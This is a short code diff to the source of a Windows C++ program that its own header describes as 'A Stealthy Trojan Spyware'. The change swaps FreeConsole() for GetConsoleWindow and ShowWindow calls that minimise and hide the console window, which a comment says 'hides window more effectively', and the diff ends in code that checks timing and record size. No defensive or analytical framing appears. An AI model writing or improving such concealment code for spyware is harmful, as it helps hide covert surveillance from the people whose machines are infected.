@@ -3,7 +3,7 @@
 * Date: 15.Aug.2014, 28.Sep.2015
 * Comment: A Stealthy Trojan Spyware.
 **/
-
+#define _WIN32_WINNT 0x0500
 #include <windows.h>
 #include <time.h>
 #include <string>
@@ -39,7 +39,10 @@ char* getRandomName();
 
 
 main(){
-    FreeConsole(); ///hide window
+    
+    HWND hWnd = GetConsoleWindow();
+    ShowWindow( hWnd, SW_MINIMIZE );  //hides window more effectively
+    ShowWindow( hWnd, SW_HIDE );
 
     age = get_setAge();
     if(checkRecordSize()){ ///check for right time
